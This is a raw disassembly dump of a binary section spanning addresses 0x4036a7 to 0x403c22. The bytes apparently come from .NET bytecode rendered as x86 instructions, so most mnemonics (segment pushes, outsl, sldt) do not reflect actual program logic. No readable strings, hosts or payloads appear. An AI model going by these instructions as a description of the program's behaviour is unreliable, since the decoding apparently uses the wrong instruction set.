  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 58             	es jb  0x40372a
  4036d2:	24 00                	and    $0x0,%al
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	6a 24                	push   $0x24
  40372e:	00 70 28             	add    %dh,0x28(%eax)
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 d4 21 00       	and    $0x21d472,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 70                	jb     0x4037ea
  40377a:	24 00                	and    $0x0,%al
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 86 24 00       	and    $0x248672,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 90 24 00       	and    $0x249072,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 9a 24 00       	and    $0x249a72,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 a0                	jb     0x40376d
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 b4             	or     -0x4c(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	b8 24 00 70 72       	mov    $0x72700024,%eax
  4037ee:	c2 24 00             	ret    $0x24
  4037f1:	70 6f                	jo     0x403862
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 ce             	or     -0x32(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	da 24 00             	fisubl (%eax,%eax,1)
  403800:	70 6f                	jo     0x403871
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 e6 24 00       	and    $0x24e672,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 f0 24 00       	and    $0x24f072,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 00 25 00       	and    $0x250072,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 0c             	or     0xc(%edx),%dh
  403859:	25 00 70 72 00       	and    $0x727000,%eax
  40385e:	25 00 70 6f 95       	and    $0x956f7000,%eax
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 16             	or     0x16(%edx),%dh
  403868:	25 00 70 72 90       	and    $0x90727000,%eax
  40386d:	24 00                	and    $0x0,%al
  40386f:	70 6f                	jo     0x4038e0
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 22 25 00       	and    $0x252272,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 3a 25 00       	and    $0x253a72,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 4c 25 00       	and    $0x254c72,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 60 25 00       	and    $0x256072,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 74 25 00       	and    $0x257472,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 ce                	jb     0x4038c3
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 7e 25 00       	and    $0x257e72,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 8a             	adc    %esi,-0x76(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 90             	or     -0x70(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 bc             	or     -0x44(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 fa    	or     0xfa720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 12                	jb     0x403a28
  403a16:	26 00 70 13          	add    %dh,%es:0x13(%eax)
  403a1a:	04 dd                	add    $0xdd,%al
  403a1c:	31 00                	xor    %eax,(%eax)
  403a1e:	00 00                	add    %al,(%eax)
  403a20:	72 1a                	jb     0x403a3c
  403a22:	26 00 70 07          	add    %dh,%es:0x7(%eax)
  403a26:	6f                   	outsl  %ds:(%esi),(%dx)
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 12                	jb     0x403a59
  403a47:	26 00 70 13          	add    %dh,%es:0x13(%eax)
  403a4b:	04 dd                	add    $0xdd,%al
  403a4d:	00 00                	add    %al,(%eax)
  403a4f:	00 00                	add    %al,(%eax)
  403a51:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 ce             	add    %dh,-0x32(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
